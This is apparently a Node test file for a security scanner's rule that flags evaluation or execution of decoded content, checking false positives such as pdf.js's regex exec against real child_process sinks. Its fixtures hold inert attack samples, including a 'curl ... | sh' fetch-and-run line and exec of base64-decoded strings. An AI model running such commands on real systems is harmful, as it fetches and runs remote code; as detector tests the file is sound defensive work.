// SC-EVAL-DECODE passes over what runs nothing hidden (FP-PDFJS-DECODE, 0.1.9; the engine's scanfile.rs
// EvalDecodeJs and jsflow/decodeuse.rs, which the npm package runs through its WebAssembly build;
// python/tests/scanner/test_eval_decode_not_hidden.py has the same cases and the reasons). A RegExp's own exec
// (pdf.js's `i.exec(decodeURIComponent(a))`), and a script the file writes, encoded on the way to a child process
// and read as code here. Sink and decoder names are stand-ins swapped back at run time, so Lazaret's scan of its own
// sources reads no call in these strings; every payload is inert text, never run.

import { test } from "node:test";
import assert from "node:assert/strict";
import { scanFile } from "../src/scanner/scan.js";

const WORDS = [["<eval>", "ev" + "al"], ["<exec>", "ex" + "ec"], ["<atob>", "at" + "ob"], ["<from>", "Buffer" + ".from"],
  ["<duc>", "decode" + "URIComponent"], ["<cp>", "child" + "_process"]];
const text = (s) => WORDS.reduce((t, [k, v]) => t.replaceAll(k, v), s);
const decode = (body, dep) => scanFile({ path: "x.js", content: text(body), lang: "js", dep })
  .filter((i) => i.rule === "SC-EVAL-DECODE").map((i) => [i.line, i.sev]);
const both = (body) => {
  const got = decode(body, false);
  assert.deepEqual(decode(body, true), got);
  return got;
};

const PDFJS_MIN = 'function getPdfFilenameFromUrl(t,e="document.pdf"){if("string"!=typeof t)return e;const i=/[^/?#=]+'
  + '\\.pdf\\b(?!.*\\.pdf\\b)/i,s=/^(?:(?:[^:]+:)?\\/\\/[^/]+)?([^?#]*)(\\?[^#]*)?(#.*)?$/.<exec>(t);let a=i.'
  + '<exec>(s[1])||i.<exec>(s[2])||i.<exec>(s[3]);if(a){a=a[0];if(a.includes("%"))try{a=i.<exec>(<duc>(a))[0]'
  + '}catch{}}return a||e}function fake(){const w=<eval>("require")(this.workerSrc);return w}'
  + "var n=[1,2].map(function(t){let i=t*2;i=i+1;return i});\n";
// the same without its eval("require"), which keeps its BLOCKER whatever else the line holds (the external review)
const PDFJS_MIN_NO_EVAL = PDFJS_MIN.replace('function fake(){const w=<eval>("require")(this.workerSrc);return w}', "");

test("a RegExp's own exec is passed over", () => {
  assert.deepEqual(both(PDFJS_MIN), [[1, "BLOCKER"]]);
  assert.deepEqual(both("module.exports = (s) => /x(\\d+)/.<exec>(<duc>(s));\n"), []);
  assert.deepEqual(both("function f(s) {\n  const re = new RegExp('^a');\n  return re.<exec>(<atob>(s));\n}\n"), []);
  assert.deepEqual(both("function f(s) {\n  return new RegExp('^/files/').<exec>(<duc>(s));\n}\n"), []);
});

test("a member is never proven a RegExp", () => {
  for (const body of [
    "const patterns = { file: /[^/]+$/ };\nfunction f(u) {\n  return patterns.file.<exec>(<duc>(u));\n}\n",
    "function f(p, u) {\n  return p.file.<exec>(<duc>(u));\n}\n",
  ]) {
    const got = both(body);
    assert.ok(got.length > 0 && got.every(([, sev]) => sev === "BLOCKER"), JSON.stringify([body, got]));
  }
});

test("the fourth case: a regex literal's exec on a decoded URL path (calasign-saas storage-export.ts:732)", () => {
  const ts = "export function siteOf(u: URL): string | null {\n"
    + "  const m = /^\\/(sites|teams)\\/[^/]+/i.<exec>(<duc>(u.pathname));\n  return m ? m[0] : null;\n}\n";
  for (const dep of [false, true]) {
    assert.deepEqual(scanFile({ path: "storage-export.ts", content: text(ts), lang: "js", dep })
      .filter((i) => i.rule === "SC-EVAL-DECODE"), []);
  }
  assert.deepEqual(both("module.exports = (x) => /a(b)/.<exec>(<atob>(x));\n"), []);
  assert.deepEqual(both("require('<cp>').<exec>(<from>(x, 'base64').toString());\n"), [[1, "BLOCKER"]]);
  assert.deepEqual(both("const cp = require('<cp>');\ncp.<exec>Sync(<atob>(x));\n"), [[2, "BLOCKER"]]);
});

test("a line whose match text decodes escapes is read on the line itself", () => {
  const esc = "function n(t){if(!l){l=/([\\u00a0\\u00b5\\u037e])/gu}return t.replace(l,'')}";
  // (what this test is for, restored at stacking: pdf.js's own regex exec on that line is passed over; with its
  // eval("require"), BLOCKER since the external review)
  assert.ok(!PDFJS_MIN_NO_EVAL.includes("<eval>"));
  assert.deepEqual(both(PDFJS_MIN_NO_EVAL), []);
  assert.deepEqual(both(esc + PDFJS_MIN_NO_EVAL), []);
  assert.deepEqual(both(esc + PDFJS_MIN), [[1, "BLOCKER"]]);
  assert.deepEqual(both(esc + "/x/.\\u0065xec(<atob>('aWQ='));\n"), [[1, "BLOCKER"]]);
});

test("a receiver not proven a regex still counts", () => {
  for (const body of [
    "let r = /x/;\nr = require('<cp>');\nr.<exec>(<atob>('aWQ='));\n",
    "const re = /x/;\nfunction g(re) {\n  return re.<exec>(<atob>('aWQ='));\n}\ng(require('<cp>'));\n",
    "const n = require('<cp>');\nn.<exec>(<atob>('aWQ='));\n",
    "RegExp.prototype.<exec> = (s) => require('<cp>').execSync(s);\nconst re = /x/;\nre.<exec>(<atob>('aWQ='));\n",
    "const re = /x/;\n<eval>(code);\nre.<exec>(<atob>('aWQ='));\n",
    "function g(t){const i=/x/i;let a=i.<exec>(<duc>(t));return a}const c=require('<cp>');c.<exec>(<atob>('aWQ='));\n",
  ]) {
    const got = both(body);
    assert.ok(got.length > 0 && got.every(([, sev]) => sev === "BLOCKER"), JSON.stringify([body, got]));
  }
});

const NODE_E = "node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\"";
const RUN = "const { execSync } = require('<cp>');\n";
const tpl = (s) => "`" + s.replaceAll("\\", "\\\\").replaceAll("`", "\\`").replaceAll("${", "\\${") + "`";
const roundTrip = (script) => `const scriptSource = ${tpl(script)};\n`
  + "const encodedScript = <from>(scriptSource).toString('base64');\n" + RUN + `execSync(\`${NODE_E}\`);\n`;

test("a script the file writes, encoded on the way, is read as code", () => {
  assert.deepEqual(both(roundTrip("console.log('hello from the child');\nprocess.exitCode = 0;\n")), [[6, "INFO"]]);
  assert.deepEqual(both(roundTrip("require('<cp>').execSync('curl -s http://192.0.2.1/x.sh | sh');\n")), [[5, "CRITICAL"]]);
});

test("a payload not in sight stays BLOCKER", () => {
  for (const pre of ["", "const encodedScript = process.env.CHILD_SCRIPT;\n",
    "const encodedScript = require('fs').readFileSync('p.b64', 'utf8');\n",
    "let encodedScript = <from>(`console.log(1)`).toString('base64');\nencodedScript = process.argv[2];\n"]) {
    assert.deepEqual(both(RUN + pre + `execSync(\`${NODE_E}\`);\n`).map(([, sev]) => sev), ["BLOCKER"], pre);
  }
});

import { readFileSync } from "node:fs";
const reviewCases = JSON.parse(readFileSync(new URL("../../rust/crates/lazaret-engine/tests/data/decode-review.json", import.meta.url), "utf8"));
for (const c of reviewCases) test(`external review: ${c.id}`, () => {
  let source = text(c.source).replaceAll("<Function>", "Function");
  if (c.size) source = source + "\n/*" + " ".repeat(c.size - source.length - 5) + "*/";
  assert.deepEqual(both(source).map(([,sev]) => sev).sort(), c.expected);
});
